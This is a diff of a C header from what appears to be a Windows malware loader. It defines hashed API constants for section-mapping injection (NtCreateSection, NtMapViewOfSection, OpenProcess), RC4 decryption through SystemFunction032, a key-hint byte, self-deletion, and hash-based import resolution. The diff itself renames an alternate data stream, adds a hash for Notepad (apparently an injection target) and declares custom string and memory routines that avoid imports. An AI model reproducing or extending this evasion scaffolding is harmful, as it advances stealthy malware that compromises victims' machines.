@@ -5,7 +5,7 @@
 // Seed of the HashStringJenkinsOneAtATime32BitA/W funtion in 'WinApi.c'
 #define INITIAL_SEED	8
 
-#define NEW_STREAM L":Mardcore"
+#define NEW_STREAM L":M4rdc0re"
 
 #define NtCreateSection_JOAA    0x192C02CE
 #define NtMapViewOfSection_JOAA         0x91436663
@@ -26,10 +26,11 @@
 #define OpenProcess_JOAA        0xAF03507E
 #define SetFileInformationByHandle_JOAA         0x6DF54277
 #define SystemFunction032_JOAA  0x8CFD40A8
-#define KERNEL32DLL_JOAA       0xFD2AD9BD
-#define USER32DLL_JOAA         0x349D72E7
+#define KERNEL32DLL_JOAA        0xFD2AD9BD
+#define USER32DLL_JOAA  0x349D72E7
 #define NTDLLDLL_JOAA   0x0141C4EE
 #define LdrLoadDll_JOAA         0xA22CF128
+#define Notepad_JOAA    0x92B01372
 
 #define KEY_SIZE 16
 #define HINT_BYTE 0x61
@@ -94,3 +95,10 @@ BOOL DeleteSelf();
 HMODULE GetModuleHandleH(DWORD dwModuleHash);
 FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiHash);
 HMODULE LoadLibraryH(LPSTR DllName);
+
+CHAR _toUpper(CHAR C);
+PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size);
+SIZE_T _CharToWchar(PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed);
+SIZE_T _StrlenA(LPCSTR String);
+SIZE_T _StrlenW(LPCWSTR String);
+UINT32 _CopyDotStr(PCHAR String);
